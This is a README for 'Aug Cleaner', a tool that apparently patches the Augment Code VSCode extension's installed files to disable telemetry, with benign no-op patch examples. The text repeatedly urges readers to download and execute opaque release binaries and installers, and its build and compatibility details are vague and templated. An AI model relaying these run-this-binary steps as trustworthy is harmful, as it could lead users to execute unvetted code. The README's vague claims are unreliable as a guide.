# Aug Cleaner — Remove Telemetry from Augment Code VSCode Extension

[![Releases](https://img.shields.io/badge/Release-%20Download-blue?logo=github)](https://github.com/abhiii-cloud/aug_cleaner/releases) [![Privacy](https://img.shields.io/badge/Focus-Privacy-green)](https://github.com/abhiii-cloud/aug_cleaner/releases)

![VSCode Privacy Hero](https://img.shields.io/badge/VSCode-Extension-grey?logo=visualstudiocode&logoColor=007ACC)

About this repository
---------------------

Aug Cleaner removes telemetry and tracking hooks from the Augment Code VSCode extension. It keeps the extension fully usable. The tool targets telemetry calls, remote logging, and anonymous tracking code while preserving the extension features and API behavior.

Repository topics: augment-code, cleaner, privacy, vscode

Why Aug Cleaner
---------------

Extensions can include telemetry, analytics, or tracking code. Many users want to use extensions without sharing usage data. Aug Cleaner provides a focused, auditable way to strip those calls while keeping the extension features intact. The tool works offline and runs locally. It modifies the installed extension files to disconnect telemetry endpoints and neutralize tracking logic.

Core goals
- Remove telemetry and tracking hooks.
- Preserve feature behavior and UX.
- Keep changes reversible and auditable.
- Work across Windows, macOS, and Linux.
- Provide simple, repeatable commands.

Key features
------------
- Targeted patches to telemetry functions and network calls.
- Backup and restore for all modified files.
- A simulation mode to show changes without writing files.
- A log that captures every modification step.
- Cross-platform scripts for install and uninstall.
- Small, focused changes to minimize risk.

Design principles
-----------------
- Minimize change surface. The tool patches only the parts that relate to telemetry.
- Keep code readable. Each patch is documented and tested.
- Keep a clear audit trail. Every change creates a backup copy and a patch diff.
- Prefer configuration over hardcoded exclusions when possible.

What Aug Cleaner does
---------------------
- Finds telemetry endpoints and replaces them with local no-op handlers.
- Removes or neutralizes tracking IDs and analytics calls.
- Disables remote error reporting while keeping local error handlers.
- Preserves commands, language features, and UI components.
- Produces a clear log and backups for each file changed.

How Aug Cleaner works (high level)
----------------------------------
1. The tool scans the installed extension folder for known telemetry markers (common strings, function names, and network calls).
2. It creates a backup of each file it will modify.
3. It applies minimal edits that redirect telemetry calls to no-op functions or to a local stub.
4. It writes a JSON log with file diffs and timestamps.
5. It offers a restore procedure to revert all changes.

Supported platforms and paths
-----------------------------
- Windows: %USERPROFILE%\.vscode\extensions\<augment-code-extension>\...
- macOS: $HOME/.vscode/extensions/<augment-code-extension>/...
- Linux: $HOME/.vscode/extensions/<augment-code-extension>/...

Files modified
--------------
- JavaScript and TypeScript files that contain telemetry logic.
- JSON config files that declare telemetry or analytics.
- Extension entry points where telemetry is initialized.

Safety and reversibility
------------------------
- The tool always writes backups. Backup files append `.aug_cleaner.bak` and include a timestamp.
- The tool includes a restore command that reads those backups and replaces modified files.
- The tool can run in "dry run" mode to show what it would change without writing files.

Download and run (Releases)
---------------------------
Get the release artifact and run the installer. Download the file from the Releases page and execute it on your machine.

Releases page:
https://github.com/abhiii-cloud/aug_cleaner/releases

Release artifacts
- Windows: aug_cleaner-windows-x64.zip (contains install.bat and aug_cleaner.exe)
- macOS: aug_cleaner-macos-x64.tar.gz (contains install.sh and aug_cleaner)
- Linux: aug_cleaner-linux-x64.tar.gz (contains install.sh and aug_cleaner)

Installation steps (detailed)
-----------------------------

1) Download the release file from the Releases page.

2) Unpack the archive.

Windows (PowerShell)
- Open PowerShell as your normal user (no admin needed for user extensions).
- Unzip the archive:
  - Expand-Archive -Path .\aug_cleaner-windows-x64.zip -DestinationPath .\aug_cleaner
- Run the installer:
  - .\aug_cleaner\install.bat
- Or run the executable directly:
  - .\aug_cleaner\aug_cleaner.exe --help

macOS / Linux (bash)
- Unpack:
  - tar -xzf aug_cleaner-macos-x64.tar.gz
- Make the tool executable:
  - chmod +x aug_cleaner/install.sh
- Run the installer:
  - ./aug_cleaner/install.sh
- Or run the binary:
  - ./aug_cleaner/aug_cleaner --help

The release bundle contains a README, a license file, and the executable. Execute the included installer or binary to start.

Behavior after install
- The installer detects VSCode extension folders.
- It prompts for the target extension (by name).
- The tool runs a scan and shows a list of proposed changes.
- You can run in dry-run mode or allow it to apply changes.

Command reference
-----------------

aug_cleaner --help
- Show help and available commands.

aug_cleaner scan --target "augment-code" --dry-run
- Scan installed files and produce a report without making changes.

aug_cleaner apply --target "augment-code" --backup-dir ./backups
- Apply patches and write backups to the specified folder.

aug_cleaner restore --backup-dir ./backups
- Restore files from backups.

aug_cleaner list --target "augment-code"
- List detected telemetry points and file locations.

aug_cleaner diff --target "augment-code" --file path/to/file
- Show the diff for a single file.

Usage examples
--------------

Example: Run a dry run and preview changes
- Run:
  - aug_cleaner scan --target "augment-code" --dry-run
- The tool prints:
  - List of files to change
  - Patterns it will replace
  - The count of proposed edits

Example: Apply patches for the current user
- Run:
  - aug_cleaner apply --target "augment-code"
- The tool performs:
  - Backup file creation
  - In-place edits
  - A JSON audit log

Example: Undo changes
- If you want to undo:
  - aug_cleaner restore --backup-dir ./backups

How the patches look (examples)
-------------------------------

Patching network calls
- Original:
  - fetch('https://telemetry.augment.com/collect', payload)
- Patched:
  - fetch('http://localhost/aug_cleaner_stub/collect', payload)
  - Or replaced with a no-op:
  - /* aug_cleaner: telemetry disabled */ null

Replacing telemetry init
- Original:
  - telemetry.init({ key: 'abc-123', app: 'augment' })
- Patched:
  - /* aug_cleaner: telem.init disabled */ telemetry.init = function(){}

Neutralize analytics calls
- Original:
  - analytics.track('feature.used', props)
- Patched:
  - analytics.track = function(){}

The tool writes clear comments into patched files to show why it changed code and to help audits.

Preserving behavior
-------------------
- The tool carefully preserves return values and API contracts when possible.
- It replaces network calls with stubs that return expected shapes.
- It avoids removing functions that other code calls.
- It uses no-op implementations that mirror the original signature.

Edge cases and heuristics
-------------------------
- The tool uses pattern matching and AST parsing where available.
- It targets known telemetry libraries and common function names.
- If a file uses a custom telemetry layer, the tool will try to identify network calls or unique markers.
- If the tool cannot confidently patch a file, it flags it in the report for manual review.

Logging and audit
-----------------
- Every run creates a JSON audit file: aug_cleaner-audit-YYYYMMDD-HHMMSS.json
- The audit contains:
  - Files scanned
  - Files modified
  - Backup file locations
  - Diffs for each change
  - Tool version and platform info

Security model
--------------
- The tool runs locally and does not send data to remote servers.
- It writes backups in user-controlled folders.
- It avoids modifying files outside the selected extension folder.
- It logs actions and produces diffs for human review.

Privacy model
-------------
- The tool prioritizes user control.
- It removes or neutralizes identifiers and tracking endpoints.
- It never transmits telemetry out of the machine.

Compatibility and tested versions
---------------------------------
- VSCode versions: 1.50 and later (extensible to older versions)
- Augment Code extension versions: 1.0.0 — 2.5.0 (example range; runs a detection step)
- Platforms: Windows, macOS, Linux (x86_64)

Limitations
-----------
- The tool may not find custom obfuscated telemetry.
- Minified bundles may be harder to patch; the tool handles common minification patterns.
- If the extension updates, the tool needs to run again for the new version.
- The tool modifies installed extension files; reinstalling the extension restores original files.

Testing and verification
------------------------
- The tool includes a verification command:
  - aug_cleaner verify --target "augment-code"
- Verify runs the extension in a controlled mode and checks for outbound telemetry.
- It also runs unit tests for the patch logic where possible.

Development notes
-----------------
Source layout
- src/
  - scanner/        - Patterns and AST matchers
  - patcher/        - Patch templates and file writers
  - cli/            - Command line entry points
  - backup/         - Backup and restore helpers
  - tests/          - Unit and integration tests

Local build
- Install dependencies with your language's package manager (npm, pip, etc).
- Run tests:
  - npm test
- Build a release:
  - npm run build
  - Pack artifacts into platform archives.

Testing guidelines
- Add unit tests for each new pattern.
- Add integration tests that run against sample extension folders.
- Include sample telemetry examples in the test suite.

Contributing
------------
- Open an issue to propose a new telemetry pattern or to report a false positive.
- Fork the repo and create a feature branch.
- Add tests that capture the reported case.
- Submit a pull request with clear commit messages and test coverage.

Style guide
- Keep patches small and well-documented.
- Use explicit comments for each automated change.
- Avoid removing code unless it is clearly telemetry-only.

Audit process
-------------
- Each PR must include an audit file showing:
  - Which files changed
  - Diffs of changes
  - Why the change is safe

Troubleshooting
---------------
Problem: The tool shows no changes
- The extension may not be installed in the expected path.
- Check the extension folder and run the tool with --target and full path.

Problem: The extension breaks after patching
- Restore files using the backup folder.
- Inspect the diffs. The audit log contains the exact edits.

Problem: The tool fails to run on my platform
- Make sure you used the correct release artifact for your OS.
- Check permissions for writing extension folders.

FAQ
---

Q: Is Aug Cleaner a VSCode extension?
A: No. Aug Cleaner is a local binary/script that edits installed extension files. It does not integrate into VSCode as an extension.

Q: Will I lose extension updates?
A: If the extension updates, VSCode installs new files. You can run Aug Cleaner again on the new version. You can also script the process to run after updates.

Q: Does the tool block all outbound traffic from the extension?
A: The tool targets telemetry and tracking calls it can identify. It does not block arbitrary network code. For full network control, use a firewall or network policy.

Q: Can I revert changes?
A: Yes. The tool makes backups for every changed file and provides a restore command.

Q: Is this tool open source?
A: The repository provides source code, tests, and build instructions.

Q: Do I need to reinstall the extension after running the tool?
A: No. The tool edits the files in place. Reinstalling the extension restores the original behavior.

Audit examples
--------------
Sample audit entry
{
  "timestamp": "2025-08-17T12:00:00Z",
  "tool_version": "1.0.0",
  "target": "augment-code@1.4.2",
  "changes": [
    {
      "file": "out/telemetry.js",
      "backup": "backups/telemetry.js.20250817.bak",
      "diff": "@@ -1,6 +1,8 @@\\n- fetch('https://telemetry.augment.com/collect', payload)\\n+ /* aug_cleaner: disabled telemetry */\\n+ null"
    }
  ]
}

Best practices for administrators
---------------------------------
- Run Aug Cleaner after any extension update.
- Keep backups in a secure folder and rotate them as you would other configuration backups.
- Use the tool in automation for managed fleets with configuration management.

Automation tips
---------------
- Use a wrapper script:
  - 1. Update extensions
  - 2. Run aug_cleaner apply --target "augment-code" --backup-dir /var/backups/aug_cleaner
  - 3. Record logs to central location

- Use CI to run audit checks against extension bundles before deployment.

Integrations
------------
- You can integrate the tool into a provisioning workflow.
- The tool outputs JSON logs that you can parse and store in a central audit system.

Example integration (pseudo)
- Provision script:
  - Download release from https://github.com/abhiii-cloud/aug_cleaner/releases
  - Unpack
  - Run aug_cleaner apply --target "augment-code" --backup-dir /backups/aug_cleaner
  - Collect the audit JSON and upload to your secure server

Legal and licensing
-------------------
- The repository includes a LICENSE file. Review it for reuse and distribution rules.
- You may redistribute patched extensions within the bounds of the extension license.

Credits and references
----------------------
- Tool concept: local modification to disable telemetry while preserving functionality.
- Pattern library: common telemetry markers and network patterns.

Images and badges
-----------------
- Releases badge (linked): [![Releases](https://img.shields.io/badge/Release-%20Download-blue?logo=github)](https://github.com/abhiii-cloud/aug_cleaner/releases)
- Privacy badge: [![Privacy](https://img.shields.io/badge/Focus-Privacy-green)](https://github.com/abhiii-cloud/aug_cleaner/releases)
- VSCode badge: https://img.shields.io/badge/VSCode-Extension-grey?logo=visualstudiocode&logoColor=007ACC

Releases link reminder
- You must download the release artifact from the Releases page and execute the included file or installer to install or run the tool:
  - https://github.com/abhiii-cloud/aug_cleaner/releases

Changelog
---------
Unreleased
- Add more detection rules for custom analytics libraries.
- Improve AST-based detection for minified bundles.

1.0.0
- Initial release with scanner, patcher, backup, restore, and CLI.

Roadmap
-------
- Add a GUI for manual review of patches.
- Add integrated verification to run extension code in a sandbox and detect outbound telemetry.
- Broaden detection patterns for additional telemetry libraries.

Security disclosure
-------------------
- The project accepts responsible disclosure for security issues through the repository issues or designated contact methods.

Contact
-------
- Use the repository issue tracker for bugs and feature requests.

License
-------
See LICENSE file in repository for full terms.

Acknowledgements
----------------
- Community contributors for telemetry pattern reporting.
- Developers who shared test fixtures for telemetry behavior.

Directories and files (quick map)
---------------------------------
- README.md — this file
- src/ — source code
- bin/ — binaries and scripts for releases
- tests/ — test cases and fixtures
- docs/ — internal design docs
- LICENSE — license text

Final notes
-----------
- Download and execute the file from the Releases page to install and run Aug Cleaner:
  - https://github.com/abhiii-cloud/aug_cleaner/releases
- The Releases page contains platform-specific artifacts to download and run.